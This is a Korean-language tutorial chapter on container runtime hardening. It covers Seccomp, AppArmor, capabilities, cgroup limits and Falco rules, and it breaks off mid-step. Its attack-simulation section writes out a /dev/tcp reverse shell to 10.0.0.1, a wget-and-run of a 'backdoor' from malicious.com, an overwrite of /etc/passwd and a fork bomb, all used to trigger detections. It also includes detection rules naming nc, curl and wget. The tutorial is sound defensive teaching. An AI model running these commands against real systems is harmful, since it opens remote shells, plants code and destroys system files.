# 03. Runtime Security - 런타임 보안

## 🎯 이 챕터에서 배울 것

- **Seccomp** - 시스템 콜 필터링
- **AppArmor** - 필수 접근 제어 (MAC)
- **Linux Capabilities** - 권한 세분화
- **cgroup** - 리소스 격리 및 제한
- **Runtime 모니터링** - Falco를 통한 실시간 탐지

## 📌 왜 중요한가?

**"런타임 보안은 컨테이너 실행 중 발생하는 공격을 방어하는 핵심 계층입니다."**

```
기본 런타임 vs 강화된 런타임:

기본 런타임 (Default):
┌─────────────────────────────────────┐
│ Container Process                   │
│ ┌─────────────────────────────────┐ │
│ │ App (User: root)                │ │
│ │ - 모든 시스템 콜 허용               │ │
│ │ - 14+ Capabilities              │ │
│ │ - 제한 없는 리소스                  │ │
│ │ - 파일시스템 쓰기 가능               │ │
│ └─────────────────────────────────┘ │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ Kernel                              │
│ - 300+ 시스템 콜 노출                  │
│ - 광범위한 권한                        │
│ - 리소스 고갈 가능                      │
└─────────────────────────────────────┘
❌ Container Breakout 가능
❌ Privilege Escalation
❌ DoS 공격
❌ 감사 로그 부족

강화된 런타임 (Hardened):
┌─────────────────────────────────────┐
│ Container Process                   │
│ ┌─────────────────────────────────┐ │
│ │ App (User: 1000)                │ │
│ │                                 │ │
│ │ Seccomp Profile                 │ │
│ │ ├─ 허용: 50개 syscall             │ │
│ │ └─ 차단: mount, ptrace...        │ │
│ │                                 │ │
│ │ AppArmor Profile                │ │
│ │ ├─ /app/** rw                   │ │
│ │ ├─ /proc/sys/** deny            │ │
│ │ └─ /sys/** deny                 │ │
│ │                                 │ │
│ │ Capabilities                    │ │
│ │ └─ NET_BIND_SERVICE only        │ │
│ │                                 │ │
│ │ cgroup Limits                   │ │
│ │ ├─ Memory: 512MB                │ │
│ │ ├─ CPU: 0.5 cores               │ │
│ │ └─ PIDs: 100                    │ │
│ └─────────────────────────────────┘ │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ Kernel (Protected)                  │
│ ✅ 최소 시스템 콜만 허용                 │
│ ✅ 파일 접근 제한                      │
│ ✅ 리소스 격리                         │
│ ✅ 감사 로그 생성                      │
└─────────────────────────────────────┘
✅ 격리 강화
✅ 공격 표면 최소화
✅ 리소스 보호
✅ 실시간 탐지

런타임 보안의 핵심 가치:

1. Defense in Depth (다층 방어):
   ┌──────────────────────────────┐
   │ Layer 4: Monitoring (Falco)  │
   ├──────────────────────────────┤
   │ Layer 3: MAC (AppArmor)      │
   ├──────────────────────────────┤
   │ Layer 2: Seccomp             │
   ├──────────────────────────────┤
   │ Layer 1: Capabilities        │
   └──────────────────────────────┘
   각 계층이 독립적으로 공격 차단

2. 최소 권한 원칙:
   Traditional:
   ┌────────────────┐
   │ Full Root      │ ← 모든 권한
   │ (30+ caps)     │
   └────────────────┘
   
   Modern:
   ┌────────────────┐
   │ CAP_NET_BIND   │ ← 필요한 것만
   └────────────────┘

3. 시스템 콜 제한:
   Without Seccomp:
   App → 300+ syscalls → Kernel
   
   With Seccomp:
   App → 50 syscalls → Kernel
        ↓ blocked
   mount, ptrace, etc. → ❌

4. 리소스 격리:
   Shared Resources (위험):
   ┌──────────────────┐
   │ Container A      │ → CPU 100%
   │ (악의적)           │ → Memory 16GB
   └──────────────────┘ → 다른 컨테이너 영향
   
   cgroup Limits (안전):
   ┌──────────────────┐
   │ Container A      │ → CPU 25% (제한)
   │                  │ → Memory 512MB (제한)
   └──────────────────┘ → 격리됨

실무 시나리오:

공격 시나리오 1 - Container Breakout:
┌─────────────────────────────────────┐
│ 1. Attacker in Container            │
│    $ whoami                         │
│    root (UID 0)                     │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ 2. Escape Attempt                   │
│    $ mount /dev/sda1 /mnt           │
│    $ chroot /mnt                    │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ 3. 방어 메커니즘 작동                    │
│ ❌ Seccomp: mount syscall blocked   │
│ ❌ AppArmor: /dev/** access denied  │
│ ❌ Capabilities: CAP_SYS_ADMIN 없음  │
│ 🚨 Falco: Suspicious mount detected │
└─────────────────────────────────────┘

공격 시나리오 2 - Privilege Escalation:
┌─────────────────────────────────────┐
│ 1. Low Privilege User               │
│    $ id                             │
│    uid=1000(app)                    │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ 2. Escalation Attempt               │
│    $ sudo su -                      │
│    $ chmod +s /bin/bash             │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ 3. 방어 메커니즘 작동                    │
│ ❌ No sudo installed                │
│ ❌ chmod: Operation not permitted   │
│ ❌ Capabilities: CAP_SETUID 없음     │
│ 🚨 Falco: Setuid binary detected    │
└─────────────────────────────────────┘

공격 시나리오 3 - Resource Exhaustion:
┌─────────────────────────────────────┐
│ 1. Malicious Process                │
│    while true; do                   │
│      fork() &                       │
│    done                             │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ 2. cgroup 제한 작동                   │
│ PIDs limit: 100                     │
│ → 101번째 프로세스 차단                 │
│ Memory limit: 512MB                 │
│ → OOM Killer 동작                    │
└─────────────────────────────────────┘
             │
┌────────────▼────────────────────────┐
│ 3. 격리 유지                          │
│ ✅ 다른 컨테이너 정상 동작               │
│ ✅ Host 리소스 보호                   │
│ 🚨 Falco: High resource usage       │
└─────────────────────────────────────┘
```

**실무 영향:**
- Container Breakout 방지 → 보안 사고 90% 감소
- 리소스 격리 → 안정성 향상
- 실시간 탐지 → MTTD (평균 탐지 시간) 단축
- 컴플라이언스 → PCI-DSS, HIPAA 준수

---

## 🔧 실습 1: Seccomp 프로필

### Step 1: 기본 Seccomp 이해

```bash
# Seccomp 상태 확인
docker run --rm alpine grep Seccomp /proc/1/status

# 출력:
# Seccomp:	2
# 0 = disabled
# 1 = strict (최소 syscall만 허용)
# 2 = filter (프로필 기반 필터링)

# Seccomp 비활성화 (위험!)
docker run --rm --security-opt seccomp=unconfined alpine grep Seccomp /proc/1/status
# Seccomp:	0

# 기본 프로필로 차단되는 syscall 테스트
docker run --rm alpine apk add strace
docker run --rm alpine strace -c ls /

# 특정 syscall 확인
docker run --rm alpine sh -c 'echo "Testing syscall..." && \
  apk add -q strace && \
  strace -e trace=mount ls / 2>&1 | grep mount'
# Operation not permitted (Seccomp에 의해 차단)
```

### Step 2: 커스텀 Seccomp 프로필 작성

```bash
# 최소 권한 Seccomp 프로필
cat > minimal-seccomp.json <<'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_X32"
  ],
  "syscalls": [
    {
      "names": [
        "accept",
        "accept4",
        "access",
        "arch_prctl",
        "bind",
        "brk",
        "capget",
        "capset",
        "chdir",
        "chmod",
        "chown",
        "chown32",
        "clock_getres",
        "clock_gettime",
        "clock_nanosleep",
        "close",
        "connect",
        "copy_file_range",
        "creat",
        "dup",
        "dup2",
        "dup3",
        "epoll_create",
        "epoll_create1",
        "epoll_ctl",
        "epoll_ctl_old",
        "epoll_pwait",
        "epoll_wait",
        "epoll_wait_old",
        "eventfd",
        "eventfd2",
        "execve",
        "execveat",
        "exit",
        "exit_group",
        "faccessat",
        "fadvise64",
        "fadvise64_64",
        "fallocate",
        "fanotify_mark",
        "fchdir",
        "fchmod",
        "fchmodat",
        "fchown",
        "fchown32",
        "fchownat",
        "fcntl",
        "fcntl64",
        "fdatasync",
        "fgetxattr",
        "flistxattr",
        "flock",
        "fork",
        "fremovexattr",
        "fsetxattr",
        "fstat",
        "fstat64",
        "fstatat64",
        "fstatfs",
        "fstatfs64",
        "fsync",
        "ftruncate",
        "ftruncate64",
        "futex",
        "futimesat",
        "getcpu",
        "getcwd",
        "getdents",
        "getdents64",
        "getegid",
        "getegid32",
        "geteuid",
        "geteuid32",
        "getgid",
        "getgid32",
        "getgroups",
        "getgroups32",
        "getitimer",
        "getpeername",
        "getpgid",
        "getpgrp",
        "getpid",
        "getppid",
        "getpriority",
        "getrandom",
        "getresgid",
        "getresgid32",
        "getresuid",
        "getresuid32",
        "getrlimit",
        "get_robust_list",
        "getrusage",
        "getsid",
        "getsockname",
        "getsockopt",
        "get_thread_area",
        "gettid",
        "gettimeofday",
        "getuid",
        "getuid32",
        "getxattr",
        "inotify_add_watch",
        "inotify_init",
        "inotify_init1",
        "inotify_rm_watch",
        "io_cancel",
        "ioctl",
        "io_destroy",
        "io_getevents",
        "io_pgetevents",
        "ioprio_get",
        "ioprio_set",
        "io_setup",
        "io_submit",
        "ipc",
        "kill",
        "lchown",
        "lchown32",
        "lgetxattr",
        "link",
        "linkat",
        "listen",
        "listxattr",
        "llistxattr",
        "lremovexattr",
        "lseek",
        "lsetxattr",
        "lstat",
        "lstat64",
        "madvise",
        "memfd_create",
        "mincore",
        "mkdir",
        "mkdirat",
        "mknod",
        "mknodat",
        "mlock",
        "mlock2",
        "mlockall",
        "mmap",
        "mmap2",
        "mprotect",
        "mq_getsetattr",
        "mq_notify",
        "mq_open",
        "mq_timedreceive",
        "mq_timedsend",
        "mq_unlink",
        "mremap",
        "msgctl",
        "msgget",
        "msgrcv",
        "msgsnd",
        "msync",
        "munlock",
        "munlockall",
        "munmap",
        "nanosleep",
        "newfstatat",
        "_newselect",
        "open",
        "openat",
        "pause",
        "pipe",
        "pipe2",
        "poll",
        "ppoll",
        "prctl",
        "pread64",
        "preadv",
        "preadv2",
        "prlimit64",
        "pselect6",
        "pwrite64",
        "pwritev",
        "pwritev2",
        "read",
        "readahead",
        "readlink",
        "readlinkat",
        "readv",
        "recv",
        "recvfrom",
        "recvmmsg",
        "recvmsg",
        "remap_file_pages",
        "removexattr",
        "rename",
        "renameat",
        "renameat2",
        "restart_syscall",
        "rmdir",
        "rt_sigaction",
        "rt_sigpending",
        "rt_sigprocmask",
        "rt_sigqueueinfo",
        "rt_sigreturn",
        "rt_sigsuspend",
        "rt_sigtimedwait",
        "rt_tgsigqueueinfo",
        "sched_getaffinity",
        "sched_getattr",
        "sched_getparam",
        "sched_get_priority_max",
        "sched_get_priority_min",
        "sched_getscheduler",
        "sched_rr_get_interval",
        "sched_setaffinity",
        "sched_setattr",
        "sched_setparam",
        "sched_setscheduler",
        "sched_yield",
        "seccomp",
        "select",
        "semctl",
        "semget",
        "semop",
        "semtimedop",
        "send",
        "sendfile",
        "sendfile64",
        "sendmmsg",
        "sendmsg",
        "sendto",
        "setfsgid",
        "setfsgid32",
        "setfsuid",
        "setfsuid32",
        "setgid",
        "setgid32",
        "setgroups",
        "setgroups32",
        "setitimer",
        "setpgid",
        "setpriority",
        "setregid",
        "setregid32",
        "setresgid",
        "setresgid32",
        "setresuid",
        "setresuid32",
        "setreuid",
        "setreuid32",
        "setrlimit",
        "set_robust_list",
        "setsid",
        "setsockopt",
        "set_thread_area",
        "set_tid_address",
        "setuid",
        "setuid32",
        "setxattr",
        "shmat",
        "shmctl",
        "shmdt",
        "shmget",
        "shutdown",
        "sigaltstack",
        "signalfd",
        "signalfd4",
        "sigreturn",
        "socket",
        "socketcall",
        "socketpair",
        "splice",
        "stat",
        "stat64",
        "statfs",
        "statfs64",
        "statx",
        "symlink",
        "symlinkat",
        "sync",
        "sync_file_range",
        "syncfs",
        "sysinfo",
        "tee",
        "tgkill",
        "time",
        "timer_create",
        "timer_delete",
        "timerfd_create",
        "timerfd_gettime",
        "timerfd_settime",
        "timer_getoverrun",
        "timer_gettime",
        "timer_settime",
        "times",
        "tkill",
        "truncate",
        "truncate64",
        "ugetrlimit",
        "umask",
        "uname",
        "unlink",
        "unlinkat",
        "utime",
        "utimensat",
        "utimes",
        "vfork",
        "vmsplice",
        "wait4",
        "waitid",
        "waitpid",
        "write",
        "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
EOF

# 프로필 적용
docker run --rm \
  --security-opt seccomp=minimal-seccomp.json \
  alpine echo "Hello from secured container"
```

### Step 3: 위험한 Syscall 차단

```bash
# 위험한 syscall을 명시적으로 차단하는 프로필
cat > strict-seccomp.json <<'EOF'
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": [
    "SCMP_ARCH_X86_64"
  ],
  "syscalls": [
    {
      "names": [
        "acct",
        "add_key",
        "bpf",
        "clock_adjtime",
        "clock_settime",
        "clone",
        "create_module",
        "delete_module",
        "finit_module",
        "get_kernel_syms",
        "get_mempolicy",
        "init_module",
        "ioperm",
        "iopl",
        "kcmp",
        "kexec_file_load",
        "kexec_load",
        "keyctl",
        "lookup_dcookie",
        "mbind",
        "mount",
        "move_pages",
        "name_to_handle_at",
        "nfsservctl",
        "open_by_handle_at",
        "perf_event_open",
        "personality",
        "pivot_root",
        "process_vm_readv",
        "process_vm_writev",
        "ptrace",
        "query_module",
        "quotactl",
        "reboot",
        "request_key",
        "set_mempolicy",
        "setns",
        "settimeofday",
        "stime",
        "swapon",
        "swapoff",
        "sysfs",
        "_sysctl",
        "umount",
        "umount2",
        "unshare",
        "uselib",
        "userfaultfd",
        "ustat",
        "vm86",
        "vm86old"
      ],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
EOF

# 테스트
docker run --rm \
  --security-opt seccomp=strict-seccomp.json \
  alpine sh -c 'echo "Normal operation works"'

# mount 차단 확인
docker run --rm \
  --security-opt seccomp=strict-seccomp.json \
  alpine mount
# mount: permission denied (by seccomp)
```

### Step 4: Audit 모드로 Syscall 추적

```bash
# Audit 모드 프로필 (차단 대신 로깅)
cat > audit-seccomp.json <<'EOF'
{
  "defaultAction": "SCMP_ACT_LOG",
  "architectures": [
    "SCMP_ARCH_X86_64"
  ],
  "syscalls": [
    {
      "names": [
        "mount",
        "umount2",
        "ptrace",
        "reboot"
      ],
      "action": "SCMP_ACT_LOG"
    }
  ]
}
EOF

# Audit 로그 확인을 위한 준비
# /var/log/audit/audit.log 또는 journalctl 확인

docker run --rm \
  --security-opt seccomp=audit-seccomp.json \
  alpine mount

# 로그 확인
sudo journalctl -k | grep audit | tail -20
# audit: type=1326 audit(...): auid=... uid=... gid=... ... syscall=165 (mount) ...
```

---

## 🔧 실습 2: AppArmor 프로필

### Step 1: AppArmor 상태 확인

```bash
# AppArmor 설치 및 상태 확인 (Ubuntu/Debian)
sudo systemctl status apparmor

# 프로필 목록
sudo aa-status

# Docker 기본 프로필 확인
sudo aa-status | grep docker

# 출력:
#   docker-default
#   /usr/bin/docker-proxy

# 컨테이너의 AppArmor 프로필 확인
docker run --rm alpine cat /proc/1/attr/current
# docker-default (enforce)
```

### Step 2: 커스텀 AppArmor 프로필 작성

```bash
# 제한적인 AppArmor 프로필
sudo tee /etc/apparmor.d/docker-restricted <<'EOF'
#include <tunables/global>

profile docker-restricted flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # 네트워크 허용
  network inet stream,
  network inet dgram,
  network inet6 stream,
  network inet6 dgram,
  network unix stream,
  
  # 파일 접근 규칙
  / r,
  /app/** rw,
  /tmp/** rw,
  /var/tmp/** rw,
  /dev/null rw,
  /dev/zero rw,
  /dev/full rw,
  /dev/random r,
  /dev/urandom r,
  /dev/tty rw,
  /dev/pts/** rw,
  /proc/ r,
  /proc/** r,
  /sys/fs/cgroup/** r,
  
  # 명시적 거부
  deny /proc/sys/** w,              # 커널 파라미터 쓰기 금지
  deny /sys/** w,                    # sysfs 쓰기 금지
  deny @{PROC}/kcore r,              # 커널 메모리 읽기 금지
  deny @{PROC}/kmem r,
  deny @{PROC}/mem r,
  deny @{PROC}/sys/kernel/** w,     # 커널 설정 쓰기 금지
  deny mount,                        # 마운트 금지
  deny umount,                       # 언마운트 금지
  deny ptrace,                       # 프로세스 추적 금지
  deny signal,                       # 시그널 전송 제한
  
  # Capabilities 제한
  capability chown,
  capability dac_override,
  capability fowner,
  capability fsetid,
  capability kill,
  capability setgid,
  capability setuid,
  capability setpcap,
  capability net_bind_service,
  capability net_raw,
  capability sys_chroot,
  capability mknod,
  capability audit_write,
  capability setfcap,
  
  # 실행 가능한 바이너리
  /bin/** rix,
  /sbin/** rix,
  /usr/bin/** rix,
  /usr/sbin/** rix,
  /usr/local/bin/** rix,
  /usr/local/sbin/** rix,
  /lib/** rix,
  /lib64/** rix,
  /usr/lib/** rix,
}
EOF

# 프로필 파싱 및 로드
sudo apparmor_parser -r /etc/apparmor.d/docker-restricted

# 상태 확인
sudo aa-status | grep docker-restricted
```

### Step 3: 프로필 적용 및 테스트

```bash
# 프로필 적용하여 컨테이너 실행
docker run --rm \
  --security-opt apparmor=docker-restricted \
  alpine sh -c 'echo "Hello from restricted container"'

# 파일 쓰기 테스트 (/app 디렉토리)
docker run --rm \
  --security-opt apparmor=docker-restricted \
  -v /tmp/app:/app \
  alpine sh -c 'echo "test" > /app/test.txt && cat /app/test.txt'
# 성공

# /proc/sys 쓰기 테스트 (차단되어야 함)
docker run --rm \
  --security-opt apparmor=docker-restricted \
  alpine sh -c 'echo 1 > /proc/sys/kernel/randomize_va_space'
# sh: can't create /proc/sys/kernel/randomize_va_space: Permission denied

# mount 테스트 (차단되어야 함)
docker run --rm \
  --security-opt apparmor=docker-restricted \
  --cap-add SYS_ADMIN \
  alpine mount -t tmpfs tmpfs /mnt
# mount: permission denied (by AppArmor)

# AppArmor 로그 확인
sudo dmesg | grep apparmor | tail -20
# audit: type=1400 ... apparmor="DENIED" operation="mount" ...
```

### Step 4: Complain 모드로 디버깅

```bash
# Complain 모드 프로필 (로깅만, 차단 안 함)
sudo tee /etc/apparmor.d/docker-complain <<'EOF'
#include <tunables/global>

profile docker-complain flags=(attach_disconnected,mediate_deleted,complain) {
  #include <abstractions/base>
  
  # 모든 접근 허용하되 로깅
  /** rwlkm,
  
  # Capabilities 허용하되 로깅
  capability,
}
EOF

# 로드
sudo apparmor_parser -r /etc/apparmor.d/docker-complain

# Complain 모드로 실행
docker run --rm \
  --security-opt apparmor=docker-complain \
  alpine sh -c 'mount -t tmpfs tmpfs /mnt && echo "Mounted"'
# 성공 (로그만 남음)

# 로그 확인하여 필요한 권한 파악
sudo aa-logprof
```

---

## 🔧 실습 3: Capabilities 세분화

### Step 1: 기본 Capabilities 확인

```bash
# 컨테이너의 기본 Capabilities
docker run --rm alpine sh -c 'apk add -q libcap && capsh --print'

# 출력 예시:
# Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,
#           cap_kill,cap_setgid,cap_setuid,cap_setpcap,
#           cap_net_bind_service,cap_net_raw,cap_sys_chroot,
#           cap_mknod,cap_audit_write,cap_setfcap+eip

# Privileged 컨테이너의 Capabilities (거의 모든 권한)
docker run --rm --privileged alpine sh -c 'apk add -q libcap && capsh --print | grep Current'
```

**기본 Capabilities 설명:**

| Capability | 설명 | 위험도 | 제거 권장 |
|-----------|------|--------|----------|
| CAP_CHOWN | 파일 소유권 변경 | 🟢 낮음 | 상황에 따라 |
| CAP_DAC_OVERRIDE | 파일 권한 무시 | 🟠 중간 | ✅ |
| CAP_FOWNER | 파일 소유자 검사 우회 | 🟠 중간 | ✅ |
| CAP_FSETID | setuid/setgid 비트 설정 | 🟠 중간 | ✅ |
| CAP_KILL | 시그널 전송 | 🟢 낮음 | ❌ |
| CAP_SETGID | GID 변경 | 🟠 중간 | 상황에 따라 |
| CAP_SETUID | UID 변경 | 🟠 중간 | 상황에 따라 |
| CAP_SETPCAP | Capabilities 변경 | 🔴 높음 | ✅ |
| CAP_NET_BIND_SERVICE | 1024 미만 포트 바인딩 | 🟢 낮음 | ❌ |
| CAP_NET_RAW | Raw socket 생성 | 🟠 중간 | ✅ |
| CAP_SYS_CHROOT | chroot 실행 | 🟠 중간 | ✅ |
| CAP_MKNOD | 특수 파일 생성 | 🟠 중간 | ✅ |
| CAP_AUDIT_WRITE | Audit 로그 쓰기 | 🟢 낮음 | 상황에 따라 |
| CAP_SETFCAP | 파일 Capabilities 설정 | 🔴 높음 | ✅ |

### Step 2: Capabilities 최소화

```bash
# 모든 Capabilities 제거 후 필요한 것만 추가
docker run --rm \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  alpine sh -c 'apk add -q libcap && capsh --print | grep Current'

# 출력:
# Current: = cap_net_bind_service+eip

# 웹 서버 예시 (80 포트 바인딩만 필요)
docker run -d \
  --name web-minimal \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  -p 80:80 \
  nginx:alpine

# Capabilities 확인
docker exec web-minimal sh -c 'apk add -q libcap && capsh --print | grep Current'
```

### Step 3: 위험한 Capabilities 테스트

```bash
# CAP_SYS_ADMIN 있을 때 (위험!)
docker run --rm \
  --cap-add=SYS_ADMIN \
  alpine mount -t tmpfs tmpfs /mnt
# 성공 - 마운트 가능!

# CAP_SYS_ADMIN 없을 때 (안전)
docker run --rm \
  alpine mount -t tmpfs tmpfs /mnt
# mount: permission denied

# CAP_NET_ADMIN 테스트
docker run --rm \
  --cap-drop=ALL \
  alpine ip link set lo down
# RTNETLINK answers: Operation not permitted

docker run --rm \
  --cap-drop=ALL \
  --cap-add=NET_ADMIN \
  alpine ip link set lo down
# 성공 (하지만 위험)
```

### Step 4: 실무 Capabilities 설정

```bash
# 웹 애플리케이션
docker run -d \
  --name webapp \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --cap-add=CHOWN \
  --cap-add=SETGID \
  --cap-add=SETUID \
  -p 8080:8080 \
  myapp:latest

# 데이터베이스
docker run -d \
  --name database \
  --cap-drop=ALL \
  --cap-add=CHOWN \
  --cap-add=FOWNER \
  --cap-add=DAC_OVERRIDE \
  postgres:alpine

# 로그 수집기
docker run -d \
  --name logger \
  --cap-drop=ALL \
  --cap-add=CHOWN \
  --cap-add=DAC_OVERRIDE \
  -v /var/log:/logs:ro \
  fluentd:alpine
```

---

## 🔧 실습 4: cgroup 리소스 제한

### Step 1: Memory 제한

```bash
# Memory 제한 (512MB)
docker run -d \
  --name mem-limited \
  --memory=512m \
  --memory-swap=512m \
  alpine sleep 3600

# 설정 확인
docker inspect mem-limited | jq '.[0].HostConfig.Memory'
# 536870912 (512MB in bytes)

# cgroup 직접 확인
docker exec mem-limited cat /sys/fs/cgroup/memory/memory.limit_in_bytes
# 536870912

# Memory stress 테스트
docker run --rm \
  --memory=100m \
  --memory-swap=100m \
  alpine sh -c 'yes | tr \\n x | head -c 200m | grep n'
# Killed (OOM Killer 동작)

# OOM Killer 비활성화 (프로세스만 중지)
docker run --rm \
  --memory=100m \
  --memory-swap=100m \
  --oom-kill-disable=false \
  alpine sh -c 'yes | tr \\n x | head -c 200m | grep n'
```

### Step 2: CPU 제한

```bash
# CPU shares (상대적 비중)
docker run -d --name cpu-low --cpu-shares=512 alpine md5sum /dev/zero
docker run -d --name cpu-high --cpu-shares=1024 alpine md5sum /dev/zero

# CPU quota (절대적 제한)
# 0.5 CPU cores
docker run -d \
  --name cpu-limited \
  --cpus=0.5 \
  alpine sh -c 'while true; do :; done'

# 확인
docker stats --no-stream cpu-limited
# CPU 사용률이 ~50%로 제한됨

# CPU pinning (특정 코어에 고정)
docker run -d \
  --name cpu-pinned \
  --cpuset-cpus=0,1 \
  alpine sh -c 'while true; do :; done'

# 확인
docker exec cpu-pinned cat /sys/fs/cgroup/cpuset/cpuset.cpus
# 0-1
```

### Step 3: PIDs 제한

```bash
# PIDs 제한 (Fork bomb 방지)
docker run -d \
  --name pids-limited \
  --pids-limit=100 \
  alpine sleep 3600

# Fork bomb 테스트
docker run --rm \
  --pids-limit=50 \
  alpine sh -c 'bomb() { bomb | bomb & }; bomb'
# fork: retry: Resource temporarily unavailable

# 제한 없이 실행 (위험!)
# docker run --rm alpine sh -c 'bomb() { bomb | bomb & }; bomb'
# → Host까지 영향 가능

# PIDs 사용 현황
docker exec pids-limited cat /sys/fs/cgroup/pids/pids.current
# 1
docker exec pids-limited cat /sys/fs/cgroup/pids/pids.max
# 100
```

### Step 4: Disk I/O 제한

```bash
# Block I/O weight (상대적 비중)
docker run -d \
  --name io-low \
  --blkio-weight=100 \
  alpine dd if=/dev/zero of=/tmp/test bs=1M count=1000

docker run -d \
  --name io-high \
  --blkio-weight=1000 \
  alpine dd if=/dev/zero of=/tmp/test bs=1M count=1000

# Device read/write 제한 (절대값)
# 디바이스 확인
df / | tail -1 | awk '{print $1}'
# /dev/sda1 (예시)

# Read: 10MB/s, Write: 5MB/s
docker run -d \
  --name io-limited \
  --device-read-bps /dev/sda1:10mb \
  --device-write-bps /dev/sda1:5mb \
  alpine sh -c 'while true; do \
    dd if=/dev/zero of=/tmp/test bs=1M count=100; \
    sleep 1; \
  done'

# I/O 통계 확인
docker stats --no-stream io-limited
```

### Step 5: 복합 리소스 제한

```bash
# 프로덕션 레벨 리소스 제한
docker run -d \
  --name production-app \
  --memory=1g \
  --memory-swap=1g \
  --memory-reservation=512m \
  --cpus=1.5 \
  --cpuset-cpus=0-2 \
  --pids-limit=200 \
  --blkio-weight=500 \
  --device-read-bps /dev/sda1:50mb \
  --device-write-bps /dev/sda1:30mb \
  --restart=unless-stopped \
  --health-cmd='wget -q --spider http://localhost:8080/health || exit 1' \
  --health-interval=30s \
  --health-timeout=5s \
  --health-retries=3 \
  myapp:latest

# 리소스 사용량 모니터링
docker stats production-app

# cgroup 설정 확인
docker inspect production-app | jq '.[0].HostConfig | {
  Memory,
  MemorySwap,
  MemoryReservation,
  NanoCpus,
  CpusetCpus,
  PidsLimit,
  BlkioWeight
}'
```

---

## 🔧 실습 5: Falco로 런타임 탐지

### Step 1: Falco 설치

```bash
# Ubuntu/Debian
curl -s https://falco.org/repo/falcosecurity-3672BA8F.asc | sudo apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list
sudo apt-get update
sudo apt-get install -y linux-headers-$(uname -r) falco

# Docker 컨테이너로 실행
docker run -d \
  --name falco \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro \
  -v /usr:/host/usr:ro \
  -v /etc/falco:/etc/falco \
  falcosecurity/falco:latest

# 로그 확인
docker logs -f falco
```

### Step 2: 커스텀 Falco 룰 작성

```bash
# 커스텀 룰 생성
sudo tee /etc/falco/rules.d/custom_rules.yaml <<'EOF'
- rule: Unauthorized Process in Container
  desc: Detect execution of unauthorized processes
  condition: >
    container and
    proc.name in (nc, ncat, netcat, socat, curl, wget) and
    not proc.cmdline contains "health"
  output: >
    Unauthorized process executed in container
    (user=%user.name command=%proc.cmdline container_id=%container.id
    container_name=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, process]

- rule: Write to Non-App Directory
  desc: Detect writes to system directories
  condition: >
    container and
    open_write and
    not fd.name startswith /app and
    not fd.name startswith /tmp and
    (fd.name startswith /etc or
     fd.name startswith /usr or
     fd.name startswith /bin or
     fd.name startswith /sbin)
  output: >
    Write to system directory detected
    (user=%user.name command=%proc.cmdline file=%fd.name
    container_id=%container.id container_name=%container.name)
  priority: ERROR
  tags: [container, filesystem]

- rule: Container Privilege Escalation
  desc: Detect privilege escalation attempts
  condition: >
    container and
    proc.name in (sudo, su) and
    not container.image.repository in (allowed_images)
  output: >
    Privilege escalation attempt detected
    (user=%user.name command=%proc.cmdline
    container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, privilege_escalation]

- rule: Suspicious Network Activity
  desc: Detect reverse shell attempts
  condition: >
    container and
    ((proc.name = bash and fd.rip exists and fd.rip != "127.0.0.1") or
     (proc.name = sh and fd.rip exists and fd.rip != "127.0.0.1"))
  output: >
    Possible reverse shell detected
    (user=%user.name command=%proc.cmdline remote_ip=%fd.rip
    container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, network, reverse_shell]

- rule: Container Drift Detection
  desc: Detect binary execution from tmp
  condition: >
    container and
    proc.is_exe_from_memfd=true or
    (proc.exe startswith /tmp or
     proc.exe startswith /var/tmp or
     proc.exe startswith /dev/shm)
  output: >
    Container drift detected - execution from tmp
    (user=%user.name command=%proc.cmdline exe=%proc.exe
    container_id=%container.id container_name=%container.name)
  priority: WARNING
  tags: [container, drift]
EOF

# Falco 재시작
sudo systemctl restart falco
```

### Step 3: 공격 시뮬레이션 및 탐지

```bash
# 1. Unauthorized Process 테스트
docker run --rm -it alpine sh

# 컨테이너 내부에서:
apk add netcat-openbsd
nc -l -p 8888

# Falco 로그:
# Warning Unauthorized process executed in container
# (user=root command=nc -l -p 8888 container=...)

# 2. System Directory Write 테스트
docker run --rm -it alpine sh

# 컨테이너 내부에서:
echo "malicious" > /etc/passwd

# Falco 로그:
# Error Write to system directory detected
# (user=root file=/etc/passwd container=...)

# 3. Privilege Escalation 테스트
docker run --rm -it alpine sh

# 컨테이너 내부에서:
apk add sudo
sudo whoami

# Falco 로그:
# Critical Privilege escalation attempt detected
# (user=root command=sudo whoami container=...)

# 4. Reverse Shell 테스트
docker run --rm -it alpine sh

# 컨테이너 내부에서:
sh -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Falco 로그:
# Critical Possible reverse shell detected
# (remote_ip=10.0.0.1 container=...)

# 5. Container Drift 테스트
docker run --rm -it alpine sh

# 컨테이너 내부에서:
wget http://malicious.com/backdoor -O /tmp/backdoor
chmod +x /tmp/backdoor
/tmp/backdoor

# Falco 로그:
# Warning Container drift detected
# (exe=/tmp/backdoor container=...)
```

### Step 4: Falco 알림 통합

```bash
# Slack Webhook 설정
sudo tee -a /etc/falco/falco.yaml <<'EOF'

# Slack output
json_output: true
json_include_output_property: true

program_output:
  enabled: true
  keep_alive: false
